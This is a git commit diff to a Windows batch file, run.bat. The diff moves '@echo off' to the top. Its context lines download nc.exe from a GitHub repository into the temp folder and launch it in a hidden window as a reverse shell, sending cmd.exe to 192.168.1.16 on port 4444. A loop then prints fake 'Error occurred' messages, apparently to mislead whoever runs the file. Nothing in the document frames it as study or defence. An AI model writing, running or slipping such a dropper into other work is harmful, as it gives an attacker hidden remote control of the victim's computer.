d877f29da3676495644ae5d7350d4c3a3d06acae
Omar Samy <osamy7592@gmail.com>
2024-06-02 14:10:18 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,6 +1,6 @@
+@echo off
 curl https://raw.githubusercontent.com/omarsamyX0/shell4/main/nc.exe -o %temp%\nc.exe
 powershell -c "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c %temp%\nc.exe -nv 192.168.1.16 4444 -e cmd.exe' -WindowStyle Hidden"
-@echo off
 for /L %%i in (1,1,40) do (
     echo Error occurred
     ping -n 1 -w 750 127.0.0.1 >nul
